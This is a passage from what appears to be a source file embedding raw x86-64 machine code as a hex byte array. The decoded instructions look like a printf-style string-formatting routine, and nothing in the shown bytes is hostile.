    0x5D, 0xC3, 0x4D, 0x85, 0xC0, 0x74, 0x05, 0x4D, 0x85, 0xE4, 0x74, 0xCD, 0x49, 0x8B, 0xC6, 0x41,
    0xB9, 0x40, 0x42, 0x0F, 0x00, 0x83, 0xE0, 0x40, 0x4D, 0x3B, 0xD1, 0x77, 0xBC, 0x48, 0xF7, 0xD8,
    0x41, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x4D, 0x1B, 0xED, 0x49, 0xF7, 0xDD, 0x4D, 0x03, 0xEB, 0x4C,
    0x89, 0x6D, 0xC8, 0x49, 0x0F, 0xBA, 0xE6, 0x08, 0x73, 0x18, 0x49, 0x8B, 0xCC, 0xE8, 0xD6, 0xFE,
    0xFF, 0xFF, 0x49, 0x3B, 0xC1, 0x77, 0x92, 0x45, 0x8D, 0x7B, 0x01, 0xBA, 0xFF, 0xFF, 0x00, 0x00,
    0xEB, 0x30, 0x4D, 0x85, 0xE4, 0x74, 0x23, 0x33, 0xC0, 0x41, 0x38, 0x04, 0x24, 0x74, 0x12, 0x49,
    0x3B, 0xC1, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0x49, 0x03, 0xC3, 0x42, 0x38, 0x34, 0x20, 0x75,
    0xEE, 0x49, 0x3B, 0xC1, 0x0F, 0x87, 0x5F, 0xFF, 0xFF, 0xFF, 0x4D, 0x8B, 0xFB, 0xBA, 0xFF, 0x00,
    0x00, 0x00, 0x48, 0x89, 0x55, 0xE0, 0x4C, 0x89, 0x7D, 0xF8, 0x4D, 0x85, 0xC0, 0x74, 0x15, 0x49,
    0x8B, 0xC2, 0x48, 0xF7, 0xD8, 0x48, 0x1B, 0xC9, 0x48, 0x23, 0xCB, 0x48, 0x8B, 0xD9, 0x48, 0x89,
    0x4D, 0x88, 0xEB, 0x09, 0x4D, 0x85, 0xD2, 0x0F, 0x84, 0x2C, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xC9,
    0x48, 0x89, 0x75, 0x00, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x4D, 0x98, 0x4C, 0x89, 0x45, 0xC0, 0x48,
    0x85, 0xDB, 0x74, 0x13, 0x4D, 0x8D, 0x42, 0xFF, 0x48, 0x89, 0x5D, 0x00, 0x4D, 0x0F, 0xAF, 0xC5,
    0x4C, 0x03, 0xC3, 0x4C, 0x89, 0x45, 0xC0, 0x4D, 0x3B, 0xFB, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x09,
    0x41, 0x0F, 0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C, 0x24, 0x48, 0x98,
    0x48, 0x0B, 0xC8, 0x48, 0x23, 0xCA, 0x48, 0x89, 0x4D, 0xD8, 0x0F, 0x84, 0xB9, 0x0C, 0x00, 0x00,
    0x48, 0x8B, 0xC1, 0x4C, 0x8D, 0x0D, 0xC6, 0x19, 0x00, 0x00, 0x49, 0x8B, 0xD4, 0x48, 0x85, 0xDB,
    0x74, 0x0C, 0x49, 0x3B, 0xD8, 0x0F, 0x83, 0x9A, 0x0C, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48, 0x0F,
    0x44, 0xC1, 0x4C, 0x89, 0x5D, 0xD0, 0x32, 0xC9, 0x48, 0xC7, 0x45, 0xE8, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x32, 0xDB, 0x89, 0x4D, 0xB0, 0x45, 0x33, 0xD2, 0x88, 0x4D, 0x81, 0x33, 0xC9, 0x44, 0x88,
    0x5D, 0x80, 0x41, 0x81, 0xE6, 0x40, 0x21, 0x00, 0x00, 0x4C, 0x89, 0x55, 0x90, 0x48, 0x89, 0x4D,
    0xF0, 0x48, 0x83, 0xF8, 0x0A, 0x0F, 0x84, 0x64, 0x08, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x0D, 0x0F,
    0x84, 0x1A, 0x08, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x25, 0x74, 0x0E, 0x48, 0x8D, 0x7D, 0xD8, 0x49,
    0x0F, 0xBA, 0xEE, 0x0A, 0xE9, 0xD0, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x5D, 0xE0, 0x41, 0xBD, 0x00,
    0x08, 0x00, 0x00, 0x49, 0x8B, 0xD4, 0x4C, 0x8B, 0xCE, 0x4D, 0x03, 0xE7, 0x4C, 0x8B, 0xD7, 0x4C,
    0x89, 0x65, 0xB8, 0x4C, 0x8B, 0xDE, 0x4C, 0x8B, 0xC7, 0x49, 0x83, 0xFF, 0x01, 0x75, 0x04, 0x33,
    0xC0, 0xEB, 0x09, 0x41, 0x0F, 0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C,
    0x24, 0x48, 0x98, 0x48, 0x0B, 0xC8, 0x48, 0x23, 0xCB, 0x48, 0x89, 0x4D, 0xD8, 0x48, 0x83, 0xF9,
    0x32, 0x0F, 0x87, 0x19, 0x01, 0x00, 0x00, 0x74, 0x4C, 0x48, 0x8B, 0xC1, 0x48, 0x85, 0xC9, 0x0F,
    0x84, 0xAC, 0x01, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x20, 0x0F, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x48,
    0x83, 0xE8, 0x0A, 0x0F, 0x84, 0x98, 0x00, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x01, 0x0F, 0x84, 0x85,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x01, 0x74, 0x76, 0x48, 0x83, 0xE8, 0x01, 0x74, 0x67, 0x48,
    0x83, 0xE8, 0x01, 0x74, 0x59, 0x48, 0x83, 0xE8, 0x02, 0x74, 0x45, 0x48, 0x83, 0xF8, 0x01, 0x0F,
    0x85, 0x7C, 0x01, 0x00, 0x00, 0x45, 0x33, 0xD2, 0x4C, 0x89, 0x55, 0x90, 0x48, 0x83, 0xF9, 0x30,
    0x0F, 0x82, 0x3C, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x39, 0x0F, 0x87, 0x2E, 0x01, 0x00, 0x00,
    0x4F, 0x8D, 0x14, 0x92, 0x4D, 0x03, 0xE7, 0x4D, 0x8D, 0x52, 0xE8, 0x4E, 0x8D, 0x14, 0x51, 0x49,
    0x83, 0xFF, 0x01, 0x0F, 0x85, 0xF5, 0x00, 0x00, 0x00, 0x33, 0xC0, 0xE9, 0xF7, 0x00, 0x00, 0x00,
    0x4D, 0x85, 0xF5, 0x75, 0xC0, 0x49, 0x83, 0xCE, 0x20, 0x45, 0x33, 0xD2, 0xEB, 0xC8, 0x4D, 0x0B,
    0xF5, 0xE9, 0x1D, 0xFF, 0xFF, 0xFF, 0x49, 0x83, 0xCE, 0x01, 0xE9, 0x14, 0xFF, 0xFF, 0xFF, 0x49,
    0x83, 0xCE, 0x08, 0xE9, 0x0B, 0xFF, 0xFF, 0xFF, 0x49, 0x83, 0xCE, 0x02, 0xE9, 0x02, 0xFF, 0xFF,
    0xFF, 0x4D, 0x85, 0xF5, 0x75, 0x2B, 0x49, 0x0F, 0xBA, 0xEE, 0x09, 0x48, 0x85, 0xF6, 0x75, 0x0A,
    0x48, 0x83, 0xC7, 0x08, 0x48, 0x89, 0x7D, 0xA8, 0xEB, 0x0B, 0x48, 0x83, 0xC6, 0x08, 0x4D, 0x8B,
    0xC3, 0x48, 0x89, 0x75, 0xA0, 0x49, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xE8, 0xE9, 0xD2, 0xFE, 0xFF,
    0xFF, 0x48, 0x85, 0xF6, 0x75, 0x0D, 0x49, 0x8B, 0x02, 0x48, 0x83, 0xC7, 0x08, 0x48, 0x89, 0x7D,
    0xA8, 0xEB, 0x0B, 0x49, 0x8B, 0x01, 0x48, 0x83, 0xC6, 0x08, 0x48, 0x89, 0x75, 0xA0, 0x48, 0x89,
    0x45, 0xD0, 0xE9, 0xAC, 0xFE, 0xFF, 0xFF, 0x49, 0x83, 0xCE, 0x04, 0xE9, 0xA3, 0xFE, 0xFF, 0xFF,
    0x48, 0x8B, 0xC1, 0x48, 0x83, 0xE8, 0x33, 0x0F, 0x84, 0x28, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8,
    0x01, 0x0F, 0x84, 0x1E, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x01, 0x0F, 0x84, 0x14, 0xFF, 0xFF,
    0xFF, 0x48, 0x83, 0xE8, 0x01, 0x0F, 0x84, 0x0A, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x01, 0x0F,
    0x84, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x01, 0x0F, 0x84, 0xF6, 0xFE, 0xFF, 0xFF, 0x48,
    0x83, 0xE8, 0x01, 0x0F, 0x84, 0xEC, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x13, 0x74, 0x06, 0x48,
    0x83, 0xF8, 0x20, 0x75, 0x5C, 0x49, 0x83, 0xCE, 0x10, 0xE9, 0x45, 0xFE, 0xFF, 0xFF, 0x41, 0x0F,
    0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C, 0x24, 0x48, 0x98, 0x48, 0x0B,
    0xC8, 0x48, 0x23, 0xCB, 0x48, 0x83, 0xF9, 0x30, 0x0F, 0x83, 0xC8, 0xFE, 0xFF, 0xFF, 0x4C, 0x89,
    0x55, 0x90, 0x4D, 0x2B, 0xE7, 0x4D, 0x85, 0xF5, 0x75, 0x0E, 0x49, 0x0F, 0xBA, 0xEE, 0x09, 0x4C,
    0x89, 0x55, 0xE8, 0xE9, 0x0B, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0x55, 0xD0, 0xE9, 0x02, 0xFE, 0xFF,
    0xFF, 0x45, 0x33, 0xD2, 0x48, 0x89, 0x55, 0xB8, 0x4C, 0x89, 0x55, 0xD0, 0x48, 0x8B, 0xDA, 0xEB,
    0x03, 0x49, 0x8B, 0xDC, 0x4C, 0x8B, 0x5D, 0xA8, 0x48, 0x8B, 0xC6, 0x4C, 0x8B, 0xC6, 0x4C, 0x8B,
    0xE6, 0x48, 0x8B, 0xF7, 0x4C, 0x8B, 0xFF, 0x4C, 0x8B, 0xEF, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0x7D,
    0xA0, 0x4D, 0x8B, 0xCB, 0x48, 0x83, 0xF9, 0x64, 0x0F, 0x87, 0x71, 0x01, 0x00, 0x00, 0x0F, 0x84,
    0x4E, 0x03, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x0A, 0x0F, 0x84, 0x0E, 0x01, 0x00, 0x00, 0x48, 0x83,
    0xF9, 0x0D, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x25, 0x0F, 0x84, 0x8F, 0x01,
    0x00, 0x00, 0x48, 0x83, 0xF9, 0x53, 0x0F, 0x84, 0x0A, 0x02, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x58,
    0x0F, 0x84, 0x05, 0x03, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x61, 0x0F, 0x84, 0xFB, 0x01, 0x00, 0x00,
    0x48, 0x83, 0xF9, 0x63, 0x0F, 0x85, 0x67, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xF7, 0x48, 0x85, 0xFF,
    0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08, 0xEB, 0x0B, 0x48, 0x83, 0xC6, 0x08, 0x4C, 0x8B, 0xDF,
    0x48, 0x89, 0x75, 0xA0, 0x41, 0x0F, 0xB7, 0x03, 0x48, 0x8D, 0x7D, 0x08, 0x48, 0x89, 0x45, 0x08,
    0x49, 0x0F, 0xBA, 0xEE, 0x0A, 0x4C, 0x8B, 0x65, 0xB8, 0x44, 0x8A, 0x5D, 0x80, 0x4C, 0x8B, 0x55,
    0x90, 0x4C, 0x8B, 0x6D, 0xC8, 0x48, 0x8B, 0x5D, 0x88, 0x4D, 0x8B, 0xCE, 0x41, 0x81, 0xE1, 0x00,
    0x04, 0x00, 0x00, 0x41, 0x8B, 0xC1, 0x48, 0xF7, 0xD8, 0x41, 0x8B, 0xC1, 0x48, 0x1B, 0xD2, 0x48,
    0xF7, 0xDA, 0x48, 0xFF, 0xC2, 0x48, 0xF7, 0xD8, 0x4D, 0x1B, 0xFF, 0x41, 0x81, 0xE7, 0x00, 0xFF,
    0x00, 0x00, 0x49, 0x81, 0xC7, 0xFF, 0x00, 0x00, 0x00, 0x49, 0x0F, 0xBA, 0xE6, 0x0C, 0x0F, 0x83,
    0x80, 0x05, 0x00, 0x00, 0x48, 0xF7, 0xDA, 0x48, 0x8B, 0xF2, 0xE9, 0xCE, 0x05, 0x00, 0x00, 0x4C,
    0x8B, 0x65, 0xB8, 0x4C, 0x03, 0x65, 0xF8, 0x48, 0x83, 0x7D, 0xF8, 0x01, 0x75, 0x04, 0x33, 0xC0,
    0xEB, 0x09, 0x41, 0x0F, 0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C, 0x24,
    0x48, 0x8D, 0x3D, 0x15, 0x16, 0x00, 0x00, 0x48, 0x98, 0x48, 0x0B, 0xC8, 0x48, 0x8D, 0x05, 0x0D,
    0x16, 0x00, 0x00, 0x48, 0x23, 0x4D, 0xE0, 0x48, 0x83, 0xF9, 0x0A, 0x48, 0x89, 0x4D, 0xD8, 0x4C,
    0x0F, 0x45, 0xE3, 0x48, 0x0F, 0x45, 0xF8, 0xE9, 0x5D, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 0x65, 0xB8,
    0x48, 0x8D, 0x3D, 0xE5, 0x15, 0x00, 0x00, 0x4C, 0x03, 0x65, 0xF8, 0x48, 0x83, 0x7D, 0xF8, 0x01,
    0x75, 0x04, 0x33, 0xC0, 0xEB, 0x09, 0x41, 0x0F, 0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41,
    0x0F, 0xB6, 0x0C, 0x24, 0x4C, 0x8B, 0x6D, 0xC8, 0x44, 0x8A, 0x5D, 0x80, 0x4C, 0x8B, 0x55, 0x90,
    0x48, 0x98, 0x48, 0x0B, 0xC8, 0x48, 0x23, 0x4D, 0xE0, 0x48, 0x89, 0x4D, 0xD8, 0x48, 0x83, 0xF9,
    0x0D, 0x0F, 0x84, 0x1E, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 0xE3, 0xE9, 0x16, 0xFF, 0xFF, 0xFF, 0x48,
    0x83, 0xE9, 0x67, 0x0F, 0x84, 0x97, 0x03, 0x00, 0x00, 0x48, 0x83, 0xE9, 0x09, 0x0F, 0x84, 0xB0,
    0x01, 0x00, 0x00, 0x48, 0x83, 0xE9, 0x02, 0x0F, 0x84, 0x06, 0x01, 0x00, 0x00, 0x48, 0x83, 0xE9,
    0x01, 0x0F, 0x84, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x83, 0xE9, 0x01, 0x74, 0x1D, 0x48, 0x83, 0xE9,
    0x01, 0x0F, 0x84, 0x9D, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x03, 0x0F, 0x84, 0x8E, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x7D, 0xD8, 0xE9, 0xB6, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0xF7, 0x48, 0x85, 0xFF,
    0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08, 0xEB, 0x0B, 0x48, 0x83, 0xC6, 0x08, 0x4C, 0x8B, 0xCF,
    0x48, 0x89, 0x75, 0xA0, 0x4D, 0x8B, 0x09, 0x4D, 0x85, 0xC9, 0x75, 0x0C, 0x48, 0x8D, 0x3D, 0xF5,
    0x14, 0x00, 0x00, 0xE9, 0x8D, 0xFE, 0xFF, 0xFF, 0x41, 0x0F, 0xB6, 0x49, 0x04, 0x41, 0x0F, 0xB7,
    0x11, 0x45, 0x0F, 0xB6, 0x41, 0x03, 0x41, 0x0F, 0xB6, 0x41, 0x05, 0x45, 0x0F, 0xB6, 0x49, 0x02,
    0x89, 0x44, 0x24, 0x40, 0x89, 0x4C, 0x24, 0x38, 0x48, 0x8D, 0x4D, 0x28, 0x89, 0x54, 0x24, 0x30,
    0x44, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC0, 0x44, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x8D, 0x0D,
    0xC4, 0x14, 0x00, 0x00, 0x41, 0x8D, 0x50, 0x26, 0xE8, 0x17, 0x08, 0x00, 0x00, 0x48, 0x8D, 0x7D,
    0x28, 0xE9, 0x3F, 0xFE, 0xFF, 0xFF, 0x49, 0x0F, 0xBA, 0xEE, 0x0A, 0x48, 0x8B, 0xC7, 0x48, 0x85,
    0xFF, 0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08, 0xEB, 0x0B, 0x48, 0x83, 0xC0, 0x08, 0x49, 0x8B,
    0xF4, 0x48, 0x89, 0x45, 0xA0, 0x48, 0x8B, 0x3E, 0x48, 0x85, 0xFF, 0x75, 0x0C, 0x49, 0x0F, 0xBA,
    0xF6, 0x0A, 0x48, 0x8D, 0x3D, 0x17, 0x14, 0x00, 0x00, 0x48, 0x8B, 0x5D, 0x88, 0x4C, 0x8B, 0x65,
    0xB8, 0x4C, 0x8B, 0x6D, 0xC8, 0x49, 0x0F, 0xBA, 0xE6, 0x0B, 0x0F, 0x82, 0xBB, 0x03, 0x00, 0x00,
    0x45, 0x33, 0xD2, 0x4C, 0x89, 0x55, 0xD0, 0x45, 0x8A, 0xDA, 0x4C, 0x8B, 0x55, 0x90, 0xE9, 0xF6,
    0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0xF7, 0x48, 0x85, 0xFF, 0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08,
    0xEB, 0x0B, 0x48, 0x83, 0xC6, 0x08, 0x49, 0x8B, 0xD0, 0x48, 0x89, 0x75, 0xA0, 0x48, 0x8B, 0x0A,
    0x48, 0x8D, 0x7D, 0x28, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x48, 0x3B,
    0xC8, 0x72, 0x2E, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x8B, 0xD1,
    0x48, 0x23, 0xD0, 0x48, 0x8D, 0x42, 0xFF, 0x48, 0x83, 0xF8, 0x22, 0x77, 0x35, 0x48, 0x6B, 0xC2,
    0x15, 0x48, 0x8D, 0x15, 0x38, 0xCD, 0xFF, 0xFF, 0x48, 0x8D, 0xBA, 0xBB, 0x47, 0x00, 0x00, 0xEB,
    0x11, 0x48, 0x83, 0xF9, 0x07, 0x77, 0x1B, 0x48, 0x6B, 0xF9, 0x19, 0x48, 0x8D, 0x05, 0x1E, 0x14,
    0x00, 0x00, 0x48, 0x03, 0xF8, 0x48, 0x8D, 0x45, 0x28, 0x48, 0x3B, 0xF8, 0x0F, 0x85, 0x63, 0xFD,
    0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x8D, 0x0D, 0xE3, 0x13, 0x00,
    0x00, 0x48, 0x8D, 0x4D, 0x28, 0x41, 0x8D, 0x50, 0x26, 0xE8, 0x16, 0x07, 0x00, 0x00, 0xE9, 0x42,
    0xFD, 0xFF, 0xFF, 0x49, 0x83, 0xE6, 0xD9, 0x49, 0x83, 0xCE, 0x10, 0x49, 0x83, 0xCE, 0x20, 0x49,
    0x0F, 0xBA, 0xEE, 0x07, 0x45, 0x84, 0xF6, 0x78, 0x09, 0x49, 0x83, 0xE6, 0xFD, 0x49, 0x0F, 0xBA,
    0xEE, 0x0E, 0x49, 0x8B, 0xD6, 0x48, 0x8B, 0xF7, 0x83, 0xE2, 0x10, 0x75, 0x1D, 0x48, 0x85, 0xFF,
    0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08, 0xEB, 0x0B, 0x48, 0x83, 0xC6, 0x08, 0x4C, 0x8B, 0xE8,
    0x48, 0x89, 0x75, 0xA0, 0x49, 0x63, 0x4D, 0x00, 0xEB, 0x1B, 0x48, 0x85, 0xFF, 0x75, 0x0B, 0x48,
    0x83, 0x45, 0xA8, 0x08, 0x49, 0x8B, 0x4D, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x08, 0x48, 0x83, 0xC6,
    0x08, 0x48, 0x89, 0x75, 0xA0, 0x41, 0x8A, 0xC6, 0xC0, 0xE0, 0x03, 0x24, 0x20, 0x44, 0x0F, 0xB6,
    0xD8, 0x41, 0xF6, 0xC6, 0x02, 0xB8, 0x2B, 0x00, 0x00, 0x00, 0x44, 0x0F, 0x45, 0xD8, 0x49, 0x8B,
    0xC6, 0x83, 0xE0, 0x08, 0x44, 0x89, 0x5D, 0xB0, 0x41, 0x0F, 0x95, 0xC2, 0x44, 0x88, 0x55, 0x81,
    0x45, 0x84, 0xF6, 0x78, 0x46, 0x41, 0xB9, 0x0A, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C,
    0x49, 0x83, 0xE6, 0xDF, 0x48, 0xC7, 0x45, 0xD0, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xC6, 0x25,
    0x00, 0x40, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x79, 0x15, 0x48, 0x85, 0xC0, 0x75, 0x15, 0x49, 0x83,
    0xCE, 0x02, 0x41, 0xB3, 0x2D, 0x44, 0x89, 0x5D, 0xB0, 0x48, 0xF7, 0xD9, 0xEB, 0x26, 0x48, 0x85,
    0xC0, 0x74, 0x21, 0x41, 0xF6, 0xC6, 0x10, 0x75, 0x1B, 0xEB, 0x17, 0x45, 0x32, 0xD2, 0x41, 0xB9,
    0x10, 0x00, 0x00, 0x00, 0x44, 0x88, 0x55, 0x81, 0x48, 0x85, 0xD2, 0x75, 0x07, 0x48, 0x85, 0xC9,
    0x79, 0x02, 0x8B, 0xC9, 0x4C, 0x8B, 0xC1, 0xC6, 0x45, 0x28, 0x00, 0x48, 0x8D, 0x7D, 0x28, 0x4C,
    0x8D, 0x1D, 0xEA, 0xCB, 0xFF, 0xFF, 0x33, 0xD2, 0x49, 0x8B, 0xC0, 0x49, 0xF7, 0xF1, 0x48, 0xFF,
    0xC7, 0x4C, 0x8B, 0xC0, 0x8B, 0xC2, 0x42, 0x8A, 0x84, 0x18, 0xB0, 0x4A, 0x00, 0x00, 0x88, 0x07,
    0x4D, 0x85, 0xC0, 0x75, 0xE1, 0x44, 0x8B, 0x5D, 0xB0, 0x48, 0x8D, 0x45, 0x28, 0x48, 0x8B, 0x75,
    0xD0, 0x4C, 0x8B, 0xC7, 0x4C, 0x2B, 0xC0, 0x48, 0x85, 0xC9, 0x75, 0x1A, 0x48, 0x85, 0xF6, 0x75,
    0x15, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x7D, 0x28, 0x33, 0xC9, 0x49, 0xB9, 0xAB, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xEB, 0x2D, 0x49, 0xB9, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0x49, 0x8B, 0xC8, 0x49, 0x8B, 0xC1, 0x49, 0xF7, 0xE0, 0x48, 0xD1, 0xEA, 0x48, 0x8D, 0x04, 0x52,
    0x48, 0x2B, 0xC8, 0x48, 0x89, 0x4D, 0xF0, 0x74, 0x0E, 0x48, 0x8B, 0xC8, 0x49, 0x2B, 0xC8, 0x48,
    0x83, 0xC1, 0x03, 0x48, 0x89, 0x4D, 0xF0, 0x45, 0x84, 0xD2, 0x74, 0x15, 0x4D, 0x85, 0xC0, 0x74,
    0x10, 0x49, 0x8D, 0x48, 0xFF, 0x49, 0x8B, 0xC1, 0x48, 0xF7, 0xE1, 0x48, 0xD1, 0xEA, 0x4C, 0x03,
    0xC2, 0x45, 0x84, 0xDB, 0x74, 0x03, 0x48, 0xFF, 0xC6, 0x4C, 0x8B, 0x65, 0xB8, 0x4D, 0x8D, 0x50,
    0x01, 0x45, 0x84, 0xDB, 0x41, 0xB3, 0x01, 0x4D, 0x0F, 0x44, 0xD0, 0x49, 0x0F, 0xBA, 0xEE, 0x0C,
    0x49, 0x8B, 0xC6, 0x4C, 0x89, 0x55, 0x90, 0x25, 0x21, 0x0A, 0x00, 0x00, 0x48, 0x3D, 0x20, 0x02,
    0x00, 0x00, 0x48, 0x0F, 0x44, 0x75, 0xE8, 0x48, 0x89, 0x75, 0xD0, 0xE9, 0x71, 0xFB, 0xFF, 0xFF,
    0x48, 0x8B, 0xF7, 0x48, 0x85, 0xFF, 0x75, 0x07, 0x48, 0x83, 0x45, 0xA8, 0x08, 0xEB, 0x0B, 0x48,
    0x83, 0xC6, 0x08, 0x4C, 0x8B, 0xF8, 0x48, 0x89, 0x75, 0xA0, 0x4D, 0x8B, 0x3F, 0x4D, 0x85, 0xFF,
    0x75, 0x0C, 0x48, 0x8D, 0x3D, 0x57, 0x11, 0x00, 0x00, 0xE9, 0x37, 0xFB, 0xFF, 0xFF, 0x41, 0x0F,
    0xB6, 0x47, 0x0F, 0x41, 0x0F, 0xB6, 0x4F, 0x0E, 0x41, 0x0F, 0xB6, 0x57, 0x0D, 0x45, 0x0F, 0xB6,
    0x47, 0x0C, 0x45, 0x0F, 0xB6, 0x4F, 0x0B, 0x45, 0x0F, 0xB6, 0x57, 0x0A, 0x45, 0x0F, 0xB6, 0x5F,
    0x09, 0x41, 0x0F, 0xB6, 0x5F, 0x08, 0x41, 0x0F, 0xB7, 0x7F, 0x06, 0x41, 0x0F, 0xB7, 0x77, 0x04,
    0x89, 0x44, 0x24, 0x70, 0x41, 0x8B, 0x07, 0x89, 0x4C, 0x24, 0x68, 0x48, 0x8D, 0x4D, 0x28, 0x89,
    0x54, 0x24, 0x60, 0x44, 0x89, 0x44, 0x24, 0x58, 0x45, 0x33, 0xC0, 0x44, 0x89, 0x4C, 0x24, 0x50,
    0x4C, 0x8D, 0x0D, 0x09, 0x11, 0x00, 0x00, 0x44, 0x89, 0x54, 0x24, 0x48, 0x44, 0x89, 0x5C, 0x24,
    0x40, 0x89, 0x5C, 0x24, 0x38, 0x41, 0x8D, 0x50, 0x26, 0x89, 0x7C, 0x24, 0x30, 0x89, 0x74, 0x24,
    0x28, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x8A, 0x04, 0x00, 0x00, 0xE9, 0x6E, 0xFC, 0xFF, 0xFF, 0x4D,
    0x03, 0xE7, 0x49, 0x83, 0xFF, 0x01, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x09, 0x41, 0x0F, 0xBE, 0x44,
    0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C, 0x24, 0x48, 0x8D, 0x3D, 0x2B, 0x11, 0x00,
    0x00, 0x48, 0x98, 0x48, 0x0B, 0xC8, 0x48, 0x23, 0x4D, 0xE0, 0x48, 0x83, 0xF9, 0x0A, 0x48, 0x89,
    0x4D, 0xD8, 0x4C, 0x0F, 0x45, 0xE2, 0x49, 0x0F, 0x45, 0xF9, 0xE9, 0x8A, 0xFA, 0xFF, 0xFF, 0x4D,
    0x03, 0xE7, 0x48, 0x8D, 0x3D, 0x03, 0x11, 0x00, 0x00, 0x49, 0x83, 0xFF, 0x01, 0x75, 0x04, 0x33,
    0xC0, 0xEB, 0x09, 0x41, 0x0F, 0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C,
    0x24, 0x48, 0x98, 0x48, 0x0B, 0xC8, 0x48, 0x23, 0x4D, 0xE0, 0x48, 0x83, 0xF9, 0x0D, 0x48, 0x89,
    0x4D, 0xD8, 0x4C, 0x0F, 0x45, 0xE2, 0xE9, 0x4E, 0xFA, 0xFF, 0xFF, 0x44, 0x8A, 0x5D, 0x80, 0xE9,
    0x46, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x5D, 0xD0, 0x4C, 0x8D, 0x47, 0x01, 0x45, 0x33, 0xD2, 0x41,
    0x80, 0x78, 0xFF, 0x00, 0x75, 0x0E, 0x48, 0x8B, 0xF2, 0x4D, 0x85, 0xC9, 0x74, 0x37, 0x41, 0x80,
    0x38, 0x00, 0x74, 0x31, 0x4C, 0x3B, 0xD3, 0x72, 0x0A, 0x48, 0x8B, 0xF2, 0x49, 0x0F, 0xBA, 0xE6,
    0x0B, 0x72, 0x22, 0x41, 0x0F, 0xBE, 0x00, 0x48, 0x8B, 0xF2, 0xC1, 0xE0, 0x08, 0x48, 0x63, 0xC8,
    0x41, 0x0F, 0xB6, 0x40, 0xFF, 0x48, 0x0B, 0xC8, 0x49, 0x85, 0xCF, 0x74, 0x08, 0x49, 0xFF, 0xC2,
    0x4C, 0x03, 0xC2, 0xEB, 0xBA, 0x48, 0x8B, 0x5D, 0x88, 0x4C, 0x89, 0x55, 0x90, 0x4C, 0x8B, 0x4D,
    0xD0, 0x49, 0x8B, 0xC6, 0x48, 0x8B, 0x4D, 0x98, 0x4D, 0x3B, 0xCA, 0x4D, 0x0F, 0x42, 0xCA, 0x25,
    0x01, 0x02, 0x00, 0x00, 0x4C, 0x89, 0x4D, 0xD0, 0x48, 0x3D, 0x00, 0x02, 0x00, 0x00, 0x75, 0x4D,
    0x4C, 0x8B, 0x45, 0xE8, 0x4D, 0x2B, 0xC1, 0x49, 0x8B, 0xC0, 0x49, 0x0F, 0xAF, 0xC5, 0x48, 0x03,
